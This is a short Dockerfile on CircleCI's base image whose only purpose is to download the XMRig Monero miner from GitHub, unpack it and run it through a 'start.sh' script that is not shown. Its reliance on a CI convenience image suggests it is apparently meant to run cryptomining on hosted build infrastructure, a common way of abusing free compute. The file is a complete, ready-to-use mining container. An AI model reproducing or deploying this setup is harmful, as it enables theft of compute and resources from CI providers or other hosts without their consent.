FROM cimg/base:stable

WORKDIR /home/circleci

RUN sudo apt update && \
    sudo apt install -y wget tar && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz

WORKDIR /home/circleci/xmrig-6.22.2

COPY start.sh .

RUN chmod +x start.sh

CMD ["./start.sh"]